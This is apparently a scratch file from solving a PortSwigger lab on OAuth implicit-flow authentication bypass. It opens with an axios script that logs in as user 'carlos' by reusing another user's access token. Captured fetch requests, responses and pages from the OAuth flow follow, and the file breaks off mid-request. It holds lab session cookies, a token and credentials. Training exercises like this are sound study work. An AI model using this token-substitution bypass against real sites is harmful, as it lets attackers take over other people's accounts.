// Strategy 1
// Replace id on my account request

// Strategy 2
// Authenticate by inserting carlos' email during authentication step recycling wiener's token and get the session from there

import axios from "axios";
import { createImportSpecifier } from "typescript";

const baseURL =
  "https://0a6d00100345f2b7c0dd14ec00ba0092.web-security-academy.net";

const authURL = baseURL + "/authenticate";
const myAccountURL = baseURL + "/my-account?id=carlos";
const email = "carlos@carlos-montoya.net";
const main = async () => {
  try {
    const res = await axios.post(
      authURL,
      {
        email,
        username: "carlos",
        token: "6b2Bi6SEC-HPM8O68VZ032ttODHG0V1uJ7AvCCbxVE3",
      },
      {
        withCredentials: true,
        headers: {
          accept: "application/json",
          "accept-language": "en-US,en;q=0.9,es;q=0.8",
          "content-type": "application/json",
          "sec-ch-ua":
            '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"macOS"',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          cookie: "session=T66OWu2Hs1uae9XK1mSmZLqH5OHcjNem",
          Referer:
            "https://0a6d00100345f2b7c0dd14ec00ba0092.web-security-academy.net/oauth-callback",
          "Referrer-Policy": "strict-origin-when-cross-origin",
        },
      }
    );
    console.log(res);

    const cookie = res.headers["set-cookie"][0].split(";")[0];

    const myAccRes = await axios.get(myAccountURL, {
      headers: {
        accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "en-US,en;q=0.9,es;q=0.8",
        "sec-ch-ua":
          '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"macOS"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        cookie,
        Referer:
          "https://0a6d00100345f2b7c0dd14ec00ba0092.web-security-academy.net/",
        "Referrer-Policy": "strict-origin-when-cross-origin",
      },
    });
    console.log(myAccRes);
  } catch (e) {
    console.log(e);
  }
};

main();



// 1.

fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "cache-control": "max-age=0",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "cross-site",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "session=5IN7ZJAryE1los7PexQCsi5dfdGqT4wt",
    "Referer": "https://portswigger.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

// HTTP/1.1 200 OK
// Content-Type: text/html; charset=utf-8
// Content-Encoding: gzip
// Connection: close
// Content-Length: 2448

// <!DOCTYPE html>
// <html>
//     <head>
//         <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
//         <link href=/resources/css/labsBlog.css rel=stylesheet>
//         <title>&#65;&#117;&#116;&#104;&#101;&#110;&#116;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#98;&#121;&#112;&#97;&#115;&#115;&#32;&#118;&#105;&#97;&#32;&#79;&#65;&#117;&#116;&#104;&#32;&#105;&#109;&#112;&#108;&#105;&#99;&#105;&#116;&#32;&#102;&#108;&#111;&#119;</title>
//     </head>
//     <body>
//             <script src="/resources/labheader/js/labHeader.js"></script>
//             <div id="academyLabHeader">
//     <section class='academyLabBanner'>
//         <div class=container>
//             <div class=logo></div>
//                 <div class=title-container>
//                     <h2>Authentication bypass via OAuth implicit flow</h2>
//                     <a class=link-back href='https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow'>
//                         Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
//                         <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
//                             <g>
//                                 <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
//                                 <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
//                             </g>
//                         </svg>
//                     </a>
//                 </div>
//                 <div class='widgetcontainer-lab-status is-notsolved'>
//                     <span>LAB</span>
//                     <p>Not solved</p>
//                     <span class=lab-status-icon></span>
//                 </div>
//             </div>
//         </div>
//     </section>
// </div>
//         <div theme="blog">
//             <section class="maincontainer">
//                 <div class="container is-page">
//                     <header class="navigation-header">
//                         <section class="top-links">
//                             <a href=/>Home</a><p>|</p>
//                             <a href="/my-account">My account</a><p>|</p>
//                         </section>
//                     </header>
//                     <header class="notification-header">
//                     </header>
//                     <section class="blog-header">
//                         <img src="/resources/images/blog.svg">
//                     </section>
//                     <section class="blog-list">
//                         <div class="blog-post">
//                         <a href="/post?postId=5"><img src="/image/blog/posts/10.jpg"></a>
//                         <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
//                         <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
//                         <a class="button is-small" href="/post?postId=5">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=8"><img src="/image/blog/posts/63.jpg"></a>
//                         <h2>Shopping Woes</h2>
//                         <p>I'm one of those really annoying people you don't want to get stuck behind in the grocery store. I love to chat, and boy can I chat, to the cashier. My money is always at the bottom of my rucksack,...</p>
//                         <a class="button is-small" href="/post?postId=8">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=6"><img src="/image/blog/posts/8.jpg"></a>
//                         <h2>Grandma's on the net</h2>
//                         <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
//                         <a class="button is-small" href="/post?postId=6">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=2"><img src="/image/blog/posts/55.jpg"></a>
//                         <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
//                         <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
//                         <a class="button is-small" href="/post?postId=2">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=3"><img src="/image/blog/posts/18.jpg"></a>
//                         <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
//                         <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
//                         <a class="button is-small" href="/post?postId=3">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=1"><img src="/image/blog/posts/6.jpg"></a>
//                         <h2>Fake News</h2>
//                         <p>Is it just me that finds the way people share things on social media, without checking into them really disturbing? I've started checking things out now, not because I want to share but so I can somehow, politely, let them...</p>
//                         <a class="button is-small" href="/post?postId=1">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=10"><img src="/image/blog/posts/44.jpg"></a>
//                         <h2>If I Close My Eyes You Can't See Me</h2>
//                         <p>A young man in Ohio was shocked to discover his Mom and Grandma had been witness to his inappropriate online behavior. Forgetting how everyone you have in your friendship circle is inextricably connected on social media, he didn't hold back...</p>
//                         <a class="button is-small" href="/post?postId=10">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=7"><img src="/image/blog/posts/14.jpg"></a>
//                         <h2>Making The Holidays Special Again</h2>
//                         <p>This time of year I tend to mourn the loss of my little ones, all grown up with no surprises left to give them. Last year I found a way to combat this melancholy, and I thought I'd share what...</p>
//                         <a class="button is-small" href="/post?postId=7">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=4"><img src="/image/blog/posts/30.jpg"></a>
//                         <h2>Benefits of Travelling</h2>
//                         <p>Travelling is such an emotive word. It can excite some, scare others and conjure images of grubby millennials backpacking around the far reaches of the earth for a few. It is however, a word that can mean whatever it is...</p>
//                         <a class="button is-small" href="/post?postId=4">View post</a>
//                         </div>
//                         <div class="blog-post">
//                         <a href="/post?postId=9"><img src="/image/blog/posts/31.jpg"></a>
//                         <h2>Finding Inspiration</h2>
//                         <p>I don't care who you are or where you're from aren't just poignant Backstreet Boys lyrics, they also ring true in life, certainly as far as inspiration goes. We all lack drive sometimes, or perhaps we have the drive but...</p>
//                         <a class="button is-small" href="/post?postId=9">View post</a>
//                         </div>
//                     </section>
//                 </div>
//             </section>
//         </div>
//     </body>
// </html>


// 2. Clicked on login/my account

fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/my-account", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "session=5IN7ZJAryE1los7PexQCsi5dfdGqT4wt",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

HTTP/1.1 302 Found
Location: /social-login
Content-Encoding: gzip
Connection: close
Content-Length: 0

// 3.

fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/social-login", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "session=5IN7ZJAryE1los7PexQCsi5dfdGqT4wt",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Connection: close
Content-Length: 1123

// 3. Redirected to social login

fetch("https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/social-login", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "session=5IN7ZJAryE1los7PexQCsi5dfdGqT4wt",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

// HTTP/1.1 200 OK
// Content-Type: text/html; charset=utf-8
// Content-Encoding: gzip
// Connection: close
// Content-Length: 1123

// 4. Redirected to auth URL

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/auth?client_id=eicfoxjnb919btohp9ppa&redirect_uri=https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/oauth-callback&response_type=token&nonce=1357825128&scope=openid%20profile%20email", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-site",
    "upgrade-insecure-requests": "1",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});


// HTTP/1.1 302 Found
// X-Powered-By: Express
// Pragma: no-cache
// Cache-Control: no-cache, no-store
// Set-Cookie: _interaction=fH9Kxp47KeKb9rwN3iTxl; path=/interaction/fH9Kxp47KeKb9rwN3iTxl; expires=Sat, 25 Jun 2022 10:28:06 GMT; samesite=lax; secure; httponly
// Set-Cookie: _interaction_resume=fH9Kxp47KeKb9rwN3iTxl; path=/auth/fH9Kxp47KeKb9rwN3iTxl; expires=Sat, 25 Jun 2022 10:28:06 GMT; samesite=lax; secure; httponly
// Location: /interaction/fH9Kxp47KeKb9rwN3iTxl
// Content-Type: text/html; charset=utf-8
// Date: Sat, 25 Jun 2022 10:18:06 GMT
// Connection: close
// Keep-Alive: timeout=5
// Content-Encoding: gzip
// Content-Length: 86


// 5. Redirect to login page

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/fH9Kxp47KeKb9rwN3iTxl", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-site",
    "upgrade-insecure-requests": "1",
    "cookie": "_interaction=fH9Kxp47KeKb9rwN3iTxl",
    "Referer": "https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

// HTTP/1.1 200 OK
// X-Powered-By: Express
// Pragma: no-cache
// Cache-Control: no-cache, no-store
// Content-Type: text/html; charset=utf-8
// ETag: W/"d0b-YRF89Pm4Mx/mdyscpodXbD9c02I"
// Date: Sat, 25 Jun 2022 10:18:07 GMT
// Connection: close
// Keep-Alive: timeout=5
// Content-Encoding: gzip
// Content-Length: 1633

<!DOCTYPE html>
<html >
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Sign-in</title>
    <style>
      //@import url(https://fonts.googleapis.com/css?family=Roboto:400,100);

      body {
        font-family: 'Roboto', sans-serif;
        margin-top: 25px;
        margin-bottom: 25px;
      }

      .login-card {
        padding: 40px;
        padding-top: 0px;
        padding-bottom: 10px;
        width: 274px;
        background-color: #F7F7F7;
        margin: 0 auto 10px;
        border-radius: 2px;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        overflow: hidden;
      }

      .login-card + .login-card {
        padding-top: 10px;
      }

      .login-card h1 {
        text-align: center;
        font-size: 2.3em;
      }

      .login-card h1 + p {
        font-weight: 100;
        text-align: center;
      }

      .login-card [type=submit] {
        width: 100%;
        display: block;
        margin-bottom: 10px;
        position: relative;
      }

      .login-card input[type=text], input[type=email], input[type=password] {
        height: 44px;
        font-size: 16px;
        width: 100%;
        margin-bottom: 10px;
        -webkit-appearance: none;
        background: #fff;
        border: 1px solid #d9d9d9;
        border-top: 1px solid #c0c0c0;
        padding: 0 8px;
        box-sizing: border-box;
        -moz-box-sizing: border-box;
      }

      .login {
        text-align: center;
        font-size: 14px;
        font-family: 'Arial', sans-serif;
        font-weight: 700;
        height: 36px;
        padding: 0 8px;
      }

      .login-submit {
        border: 0px;
        color: #fff;
        text-shadow: 0 1px rgba(0,0,0,0.1);
        background-color: #4d90fe;
      }

      .login-card a {
        text-decoration: none;
        color: #666;
        font-weight: 400;
        text-align: center;
        display: inline-block;
        opacity: 0.6;
      }

      .login-help {
        width: 100%;
        text-align: center;
        font-size: 12px;
      }

      .login-client-image img {
        margin-bottom: 20px;
        display: block;
        margin-left: auto;
        margin-right: auto;
        width: 20%;
      }

      .login-card input[type=checkbox] {
        margin-bottom: 10px;
      }

      .login-card label {
        color: #999;
      }

      ul {
        padding-left: 1em;
        list-style-type: circle;
      }

      li + ul, ul + li, li + li {
        padding-top: 0.3em;
      }

      button {
        cursor: pointer;
      }
    </style>
  <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet></head>
  <body><div id="academyLabHeader">
  <section class="academyLabBanner">
    <div class="container">
      <img src="/resources/labheader/images/logoAcademy.svg">
      <div class="title-container">
        <h2>Authentication bypass via OAuth implicit flow</h2>
        <a id="lab-link" class="button" href="https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net">Back to lab home</a>
        <a class="link-back" href="https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow">Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow"><g><polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon><polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon></g></svg></a>
      </div>
    </div>
  </section>
</div>

    <div class="login-card">
      <h1>Sign-in</h1>
      
      <form autocomplete="off" action="/interaction/fH9Kxp47KeKb9rwN3iTxl/login" class="login-form" method="post">
        <input required type="text" name="username" placeholder="Enter a username or email" autofocus="on">
        <input required type="password" name="password" placeholder="and password" >

        <button type="submit" class="login login-submit">Sign-in</button>
      </form>
      <div class="login-help">
        <a href="/interaction/fH9Kxp47KeKb9rwN3iTxl/abort">[ Cancel ]</a>
        
        
      </div>
    </div>
  </body>
</html>


// Strange error

// SessionNotFound: invalid_request
//     at Provider.getInteraction (/opt/node-v14.17.6-linux-x64/lib/node_modules/oidc-provider/lib/provider.js:50:11)
//     at Provider.interactionDetails (/opt/node-v14.17.6-linux-x64/lib/node_modules/oidc-provider/lib/provider.js:228:27)
//     at /home/carlos/oauth/index.js:191:50
//     at Layer.handle [as handle_request] (/opt/node-v14.17.6-linux-x64/lib/node_modules/express/lib/router/layer.js:95:5)
//     at next (/opt/node-v14.17.6-linux-x64/lib/node_modules/express/lib/router/route.js:137:13)
//     at /opt/node-v14.17.6-linux-x64/lib/node_modules/body-parser/lib/read.js:130:5
//     at invokeCallback (/opt/node-v14.17.6-linux-x64/lib/node_modules/body-parser/node_modules/raw-body/index.js:224:16)
//     at done (/opt/node-v14.17.6-linux-x64/lib/node_modules/body-parser/node_modules/raw-body/index.js:213:7)
//     at IncomingMessage.onEnd (/opt/node-v14.17.6-linux-x64/lib/node_modules/body-parser/node_modules/raw-body/index.js:273:7)
//     at IncomingMessage.emit (events.js:412:35)


// 6. Entered credentials and clicked login

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L/login", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "_interaction=6ZjkMMmQLjW7PNYfnJq_L",
    "Referer": "https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "username=wiener&password=peter",
  "method": "POST"
});

HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/auth/6ZjkMMmQLjW7PNYfnJq_L
Date: Sat, 25 Jun 2022 10:29:42 GMT
Connection: close
Keep-Alive: timeout=5
Content-Encoding: gzip
Content-Length: 0


// 7. Redirected to new auth location

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/auth/6ZjkMMmQLjW7PNYfnJq_L", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "cache-control": "max-age=0",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "_interaction_resume=6ZjkMMmQLjW7PNYfnJq_L",
    "Referer": "https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Set-Cookie: _interaction=6ZjkMMmQLjW7PNYfnJq_L; path=/interaction/6ZjkMMmQLjW7PNYfnJq_L; expires=Sat, 25 Jun 2022 10:39:42 GMT; samesite=lax; secure; httponly
Set-Cookie: _interaction_resume=6ZjkMMmQLjW7PNYfnJq_L; path=/auth/6ZjkMMmQLjW7PNYfnJq_L; expires=Sat, 25 Jun 2022 10:39:42 GMT; samesite=lax; secure; httponly
Set-Cookie: _session=z6LM7b1_vGNSFRcF6WlQY; path=/; expires=Sat, 09 Jul 2022 10:29:42 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=z6LM7b1_vGNSFRcF6WlQY; path=/; expires=Sat, 09 Jul 2022 10:29:42 GMT; secure; httponly
Location: /interaction/6ZjkMMmQLjW7PNYfnJq_L
Content-Type: text/html; charset=utf-8
Date: Sat, 25 Jun 2022 10:29:42 GMT
Connection: close
Keep-Alive: timeout=5
Content-Encoding: gzip
Content-Length: 86

// 8. Redirected to new interaction location

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,es;q=0.8",
    "cache-control": "max-age=0",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "cookie": "_interaction=6ZjkMMmQLjW7PNYfnJq_L; _session=z6LM7b1_vGNSFRcF6WlQY; _session.legacy=z6LM7b1_vGNSFRcF6WlQY",
    "Referer": "https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

HTTP/1.1 200 OK
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: text/html; charset=utf-8
ETag: W/"dbe-BVH1TikuSKLbdq2cjzoJDq9pds4"
Date: Sat, 25 Jun 2022 10:29:42 GMT
Connection: close
Keep-Alive: timeout=5
Content-Encoding: gzip
Content-Length: 1691

<!DOCTYPE html>
<html >
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Sign-in</title>
    <style>
      //@import url(https://fonts.googleapis.com/css?family=Roboto:400,100);

      body {
        font-family: 'Roboto', sans-serif;
        margin-top: 25px;
        margin-bottom: 25px;
      }

      .login-card {
        padding: 40px;
        padding-top: 0px;
        padding-bottom: 10px;
        width: 274px;
        background-color: #F7F7F7;
        margin: 0 auto 10px;
        border-radius: 2px;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        overflow: hidden;
      }

      .login-card + .login-card {
        padding-top: 10px;
      }

      .login-card h1 {
        font-weight: 100;
        text-align: center;
        font-size: 2.3em;
      }

      .login-card [type=submit] {
        width: 100%;
        display: block;
        margin-bottom: 10px;
        position: relative;
      }

      .login-card input[type=text], input[type=email], input[type=password] {
        height: 44px;
        font-size: 16px;
        width: 100%;
        margin-bottom: 10px;
        -webkit-appearance: none;
        background: #fff;
        border: 1px solid #d9d9d9;
        border-top: 1px solid #c0c0c0;
        padding: 0 8px;
        box-sizing: border-box;
        -moz-box-sizing: border-box;
      }

      .login {
        text-align: center;
        font-size: 14px;
        font-family: 'Arial', sans-serif;
        font-weight: 700;
        height: 36px;
        padding: 0 8px;
      }

      .login-submit {
        border: 0px;
        color: #fff;
        text-shadow: 0 1px rgba(0,0,0,0.1);
        background-color: #4d90fe;
      }

      .login-card a {
        text-decoration: none;
        color: #666;
        font-weight: 400;
        text-align: center;
        display: inline-block;
        opacity: 0.6;
      }

      .login-help {
        width: 100%;
        text-align: center;
        font-size: 12px;
      }

      .login-client-image img {
        margin-bottom: 20px;
        display: block;
        margin-left: auto;
        margin-right: auto;
        width: 20%;
        min-width: 150px;
      }

      .login-card input[type=checkbox] {
        margin-bottom: 10px;
      }

      .login-card label {
        color: #999;
      }

      ul {
        padding-left: 1em;
        list-style-type: circle;
      }

      li + ul, ul + li, li + li {
        padding-top: 0.3em;
      }

      button {
        cursor: pointer;
      }
    </style>
  <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet></head>
  <body><div id="academyLabHeader">
  <section class="academyLabBanner">
    <div class="container">
      <img src="/resources/labheader/images/logoAcademy.svg">
      <div class="title-container">
        <h2>Authentication bypass via OAuth implicit flow</h2>
        <a id="lab-link" class="button" href="https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net">Back to lab home</a>
        <a class="link-back" href="https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow">Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow"><g><polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon><polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon></g></svg></a>
      </div>
    </div>
  </section>
</div>

    <div class="login-card">
      <h1>Authorize</h1>
      <div class="login-client-image">
        <img src="https://0a6f009104d2c0d8c0828ac800d500d1.web-security-academy.net/resources/images/blog.svg">
      </div>

      <ul>
      
      
        <li><strong>WeLikeToBlog</strong> is requesting access to:</li>
        <ul>
          
            <li>Profile</li>
          
            <li>Email</li>
          
        </ul>
      

      
      

      

      </ul>

      <form autocomplete="off" action="/interaction/6ZjkMMmQLjW7PNYfnJq_L/confirm" method="post">
        <button autofocus type="submit" class="login login-submit">Continue</button>
      </form>
      <div class="login-help">
        <a href="/interaction/6ZjkMMmQLjW7PNYfnJq_L/abort">[ Cancel ]</a>
        
        
      </div>
    </div>
  </body>
</html>

// 9. Confirm authorization access for permissions

fetch("https://oauth-0ad80036049fc0f5c0a08aba0254002a.web-security-academy.net/interaction/6ZjkMMmQLjW7PNYfnJq_L/confirm", {
  "headers": {
